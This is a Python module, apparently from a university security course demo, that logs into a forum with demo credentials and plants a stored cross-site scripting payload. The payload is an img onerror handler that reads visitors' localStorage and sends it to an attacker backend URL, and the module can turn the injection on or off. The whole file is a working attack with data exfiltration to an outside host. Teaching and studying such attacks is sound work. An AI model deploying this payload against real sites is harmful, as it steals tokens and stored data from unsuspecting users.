import os
from typing import Dict, Literal

from dotenv import load_dotenv

from .xss_attack_tool import XssAttackTool
from .xss_attack_tool import XssAttackToolConfig

load_dotenv()

ATTACK_TARGET_URL = os.environ.get('ATTACK_TARGET_URL', "https://elec0138-forum.0138019.xyz/")
ATTACK_USERNAME = os.environ.get('ATTACK_USERNAME', "xss_demo")
ATTACK_PASSWORD = os.environ.get('ATTACK_PASSWORD', "xss_demo_password")
ATTACK_BACKEND_URL = os.environ.get('ATTACK_BACKEND_URL')

if ATTACK_BACKEND_URL is None:
    raise ValueError("ATTACK_BACKEND_URL environment variable is not set. This is required for the attack to work.")


def run_attack_operation(operation: Literal["enable", "disable"]) -> Dict[str, any]:
    pl = f"<img src=\"x\" onerror=\"const d={{dt:'elec0138-xss',ls:JSON.stringify(localStorage)}};new Image().src='{ATTACK_BACKEND_URL}?'+new URLSearchParams(d)\">"

    try:
        attack_tool = XssAttackTool(
            XssAttackToolConfig(
                target_app_url=ATTACK_TARGET_URL,
                target_app_username=ATTACK_USERNAME,
                target_app_password=ATTACK_PASSWORD,
                xss_payload=pl,
            ),
            headless=True
        )

        result = attack_tool.execute(operation)

        return {
            "success": True if result else False,
            "message": f"{'Successfully' if result else 'Failed to'} {operation} the attack."
        }

    except Exception as e:
        return {
            "success": False,
            "message": f"Error during attack {operation}: {str(e)}"
        }
